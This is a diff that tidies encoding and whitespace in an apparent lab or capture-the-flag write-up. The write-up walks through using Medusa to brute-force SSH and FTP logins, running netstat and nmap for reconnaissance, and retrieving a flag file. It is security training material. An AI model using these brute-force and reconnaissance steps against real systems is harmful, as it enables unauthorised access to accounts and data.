@@ -1,14 +1,14 @@
-﻿In the dynamic landscape of cybersecurity, maintaining robust authentication mechanisms is paramount. While technologies like Secure Shell (`SSH`) and File Transfer Protocol (`FTP`) facilitate secure remote access and file management, they are often reliant on traditional username-password combinations, presenting potential vulnerabilities exploitable through brute-force attacks. In this module, we will delve into the practical application ofÂ `Medusa`, a potent brute-forcing tool, to systematically compromise both SSH and FTP services, thereby illustrating potential attack vectors and emphasizing the importance of fortified authentication practices.
+﻿In the dynamic landscape of cybersecurity, maintaining robust authentication mechanisms is paramount. While technologies like Secure Shell (`SSH`) and File Transfer Protocol (`FTP`) facilitate secure remote access and file management, they are often reliant on traditional username-password combinations, presenting potential vulnerabilities exploitable through brute-force attacks. In this module, we will delve into the practical application of`Medusa`, a potent brute-forcing tool, to systematically compromise both SSH and FTP services, thereby illustrating potential attack vectors and emphasizing the importance of fortified authentication practices.
 
-`SSH`Â is a cryptographic network protocol that provides a secure channel for remote login, command execution, and file transfers over an unsecured network. Its strength lies in its encryption, which makes it significantly more secure than unencrypted protocols likeÂ `Telnet`. However, weak or easily guessable passwords can undermine SSH's security, exposing it to brute-force attacks.
+`SSH` is a cryptographic network protocol that provides a secure channel for remote login, command execution, and file transfers over an unsecured network. Its strength lies in its encryption, which makes it significantly more secure than unencrypted protocols like`Telnet`. However, weak or easily guessable passwords can undermine SSH's security, exposing it to brute-force attacks.
 
-`FTP`Â is a standard network protocol for transferring files between a client and a server on a computer network. It's also widely used for uploading and downloading files from websites. However, standard FTP transmits data, including login credentials, in cleartext, rendering it susceptible to interception and brute-forcing.
+`FTP` is a standard network protocol for transferring files between a client and a server on a computer network. It's also widely used for uploading and downloading files from websites. However, standard FTP transmits data, including login credentials, in cleartext, rendering it susceptible to interception and brute-forcing.
 
 ## Kick-off
 
 **To follow along, start the target system via the question section at the bottom of the page.**
 
-We begin our exploration by targeting an SSH server running on a remote system. Assuming prior knowledge of the usernameÂ `sshuser`, we can leverage Medusa to attempt different password combinations until successful authentication is achieved systematically.
+We begin our exploration by targeting an SSH server running on a remote system. Assuming prior knowledge of the username`sshuser`, we can leverage Medusa to attempt different password combinations until successful authentication is achieved systematically.
 
 The following command serves as our starting point:
 
@@ -47,18 +47,17 @@ This command will initiate an interactive SSH session, granting you access to th
 
 ### Expanding the Attack Surface
 
-Once inside the system, the next step is identifying other potential attack surfaces. UsingÂ `netstat`Â (within the SSH session) to list open ports and listening services, you discover a service running on port 21.
+Once inside the system, the next step is identifying other potential attack surfaces. Using`netstat` (within the SSH session) to list open ports and listening services, you discover a service running on port 21.
 
-Â 
 ```shell-session
 smoothment@htb[/htb]$ netstat -tulpn | grep LISTEN
 
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
-tcp6       0      0 :::22                   :::*                    LISTEN      -
-tcp6       0      0 :::21                   :::*                    LISTEN      -
+tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN -
+tcp6 0 0 :::22 :::* LISTEN -
+tcp6 0 0 :::21 :::* LISTEN -
 ```
 
-Further reconnaissance withÂ `nmap`Â (within the SSH session) confirms this finding as an ftp server.
+Further reconnaissance with`nmap` (within the SSH session) confirms this finding as an ftp server.
 
 
 ```shell-session
@@ -69,9 +68,9 @@ Nmap scan report for localhost (127.0.0.1)
 Host is up (0.000078s latency).
 Other addresses for localhost (not scanned): ::1
 Not shown: 998 closed ports
-PORT   STATE SERVICE
-21/tcp open  ftp
-22/tcp open  ssh
+PORT STATE SERVICE
+21/tcp open ftp
+22/tcp open ssh
 
 Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
 ```
@@ -80,7 +79,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
 
 Having identified the FTP server, you can proceed to brute-force its authentication mechanism.
 
-If we explore theÂ `/home`Â directory on the target system, we see anÂ `ftpuser`Â folder, which implies the likelihood of the FTP server username beingÂ `ftpuser`. Based on this, we can modify our Medusa command accordingly:
+If we explore the`/home` directory on the target system, we see an`ftpuser` folder, which implies the likelihood of the FTP server username being`ftpuser`. Based on this, we can modify our Medusa command accordingly:
 
 
 ```shell-session
@@ -101,13 +100,13 @@ GENERAL: Medusa has finished.
 The key differences here are:
 
 - `-h 127.0.0.1`: Targets the local system, as the FTP server is running locally. Using the IP address tells medusa explicitly to use IPv4.
-- `-u ftpuser`: Specifies the usernameÂ `ftpuser`.
+- `-u ftpuser`: Specifies the username`ftpuser`.
 - `-M ftp`: Selects the FTP module within Medusa.
 - `-t 5`: Increases the number of parallel login attempts to 5.
 
 ### Retrieving The Flag
 
-Upon successfully cracking the FTP password, establish an FTP connection. Within the FTP session, use theÂ `get`Â command to download theÂ `flag.txt`Â file, which may contain sensitive information.:
+Upon successfully cracking the FTP password, establish an FTP connection. Within the FTP session, use the`get` command to download the`flag.txt` file, which may contain sensitive information.:
 
 
 ```shell-session
@@ -124,13 +123,13 @@ Using binary mode to transfer files.
 ftp> ls
 229 Entering Extended Passive Mode (|||25926|)
 150 Here comes the directory listing.
--rw-------    1 1001     1001           35 Sep 05 13:17 flag.txt
+-rw------- 1 1001 1001 35 Sep 05 13:17 flag.txt
 226 Directory send OK.
 ftp> get flag.txt
 local: flag.txt remote: flag.txt
 229 Entering Extended Passive Mode (|||37251|)
 150 Opening BINARY mode data connection for flag.txt (35 bytes).
-100% |***************************************************************************|    35      776.81 KiB/s    00:00 ETA
+100% |***************************************************************************| 35 776.81 KiB/s 00:00 ETA
 226 Transfer complete.
 35 bytes received in 00:00 (131.45 KiB/s)
 ftp> exit
@@ -180,9 +179,9 @@ ssh sshuser@94.237.54.164 -p 59668
 sshuser@94.237.54.164's password:
 Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.1.0-10-amd64 x86_64)
 
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/pro
+ * Documentation: https://help.ubuntu.com
+ * Management: https://landscape.canonical.com
+ * Support: https://ubuntu.com/pro
 
 This system has been minimized by removing packages and content that are
 not required on a system that users do not log into.
@@ -204,9 +203,9 @@ We get this:
 ```
 sshuser@ng-1340293-loginbfservice-amvfj-8678d96dc8-r66vm:~$ netstat -tulpn | grep LISTEN
 (No info could be read for "-p": geteuid()=1000 but you should be root.)
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
-tcp6       0      0 :::21                   :::*                    LISTEN      -               
-tcp6       0      0 :::22                   :::*                    LISTEN      -
+tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - 
+tcp6 0 0 :::21 :::* LISTEN - 
+tcp6 0 0 :::22 :::* LISTEN -
 ```
 
 We can think that the service running on port 21 is FTP, Nmap is enabled on the machine, let's run a scan to identify the services:
@@ -218,9 +217,9 @@ Nmap scan report for localhost (127.0.0.1)
 Host is up (0.00011s latency).
 Other addresses for localhost (not scanned): ::1
 Not shown: 998 closed ports
-PORT   STATE SERVICE
-21/tcp open  ftp
-22/tcp open  ssh
+PORT STATE SERVICE
+21/tcp open ftp
+22/tcp open ssh
 
 Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds
 ```
@@ -230,7 +229,7 @@ It was ftp indeed, machine also has medusa installed, this can help us brute for
 
 ```
 sshuser@ng-1340293-loginbfservice-amvfj-8678d96dc8-r66vm:~$ ls /home
-ftpuser  sshuser
+ftpuser sshuser
 ```
 
 We got other user `ftpuser`, let's brute force:
@@ -270,7 +269,7 @@ Using binary mode to transfer files.
 ftp> ls
 229 Entering Extended Passive Mode (|||26248|)
 150 Here comes the directory listing.
--rw-------    1 1001     1001           35 Feb 13 20:24 flag.txt
+-rw------- 1 1001 1001 35 Feb 13 20:24 flag.txt
 226 Directory send OK.
 ```
 
@@ -281,7 +280,7 @@ ftp> get flag.txt
 local: flag.txt remote: flag.txt
 229 Entering Extended Passive Mode (|||34427|)
 150 Opening BINARY mode data connection for flag.txt (35 bytes).
-100% |***************************************************|    35      697.54 KiB/s    00:00 ETA
+100% |***************************************************| 35 697.54 KiB/s 00:00 ETA
 226 Transfer complete.
 
 cat flag.txt
